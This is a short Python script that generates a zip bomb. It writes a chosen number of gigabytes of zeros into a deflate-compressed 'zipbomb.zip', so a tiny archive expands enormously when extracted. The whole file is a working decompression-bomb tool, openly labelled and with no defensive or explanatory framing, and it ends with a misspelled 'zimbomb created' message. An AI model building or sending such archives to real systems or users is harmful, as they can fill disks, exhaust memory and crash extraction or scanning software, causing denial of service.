import sys
import zipfile as zf

if len(sys.argv) !=2:
    print(f"Usage: python {sys.argv[0]} <size_in_gb>")
    sys.exit(1)

size_gb = float(sys.argv[1])
size_bytes = int(size_gb * 1000000000)

zip_name = "zipbomb.zip"
file_name = "data.txt"
chunk_size = 1024*1024

chunk = b"0" * chunk_size
with zf.ZipFile(zip_name, "w", compression=zf.ZIP_DEFLATED) as Z:
    with Z.open(file_name, "w") as F:
        remaining = size_bytes
        while remaining > 0:
            n = min(chunk_size,remaining)
            F.write(chunk[:n])
            remaining-=n
print(f"zimbomb created")